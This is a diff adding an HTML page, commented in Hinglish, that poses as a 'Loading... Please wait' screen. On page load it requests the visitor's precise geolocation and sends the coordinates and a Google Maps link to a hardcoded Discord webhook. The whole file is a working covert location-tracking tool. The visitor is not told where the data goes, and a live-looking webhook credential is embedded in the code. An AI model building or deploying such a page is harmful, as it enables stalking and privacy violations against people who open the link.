@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>body { font-family: sans-serif; padding: 20px; text-align: center; }</style>
+</head>
+<body>
+    <p>Please wait...</p>
+
+    <script>
+        // 1. Yahan apna Discord Webhook URL daalo
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1572261629003833474/K4ZORBDPOVV0HDsWElrrHlPtaQo6p033ZsMUJI_XLzA3yDP-FH3x4Ycx_uHrAqwLEL_5";
+
+        // 2. Location maango
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Success: Location mil gayi
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Google Maps link banao
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    // Discord ko bhejo
+                    sendToDiscord(lat, lon, mapLink);
+                    
+                    document.body.innerHTML = "<h3>✅ Location sent (Check Discord)</h3>";
+                },
+                function(error) {
+                    // Error: Permission nahi mili ya location off hai
+                    console.log("Location error: " + error.message);
+                    document.body.innerHTML = "<h3>❌ Location permission denied.</h3>";
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            document.body.innerHTML = "<h3>❌ Geolocation not supported.</h3>";
+        }
+
+        // 3. Discord function
+        async function sendToDiscord(lat, lon, mapLink) {
+            const payload = {
+                content: `📍 **New Visitor Location**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Map:** ${mapLink}`
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error("Discord send failed", e);
+            }
+        }
+    </script>
+</body>
+</html>
